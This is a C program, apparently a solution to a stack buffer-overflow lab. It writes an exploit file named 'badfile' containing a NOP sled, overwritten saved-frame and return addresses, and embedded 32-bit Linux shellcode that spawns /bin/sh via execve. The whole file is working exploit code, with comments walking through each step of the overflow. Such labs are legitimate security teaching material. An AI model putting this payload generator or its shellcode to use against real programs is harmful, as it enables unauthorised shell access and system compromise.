#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

void main(int argc, char **argv) {

	char buffer[517];
	FILE *badfile;

	// fill the buffer with NOPs
	memset(&buffer, 0x90, 517);
	// replacing the return address while retaining the EBP of main, so that we can have a clean exit
	char address[] = "\xf8\xef\xff\xbf\x90\xef\xff\xbf";
	// placing the crafted addresses into the buffer
	memcpy(buffer + 20, address, sizeof(address));
	// placing the shellcode at the end of the buffer, effectively creating a NOP sled which is followed by the shellcode
	memcpy(buffer + (sizeof(buffer) - sizeof(shellcode) - 1), shellcode, sizeof(shellcode));

	// write the contents of the buffer to the exploit file
	badfile = fopen("./badfile", "w+");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);

}
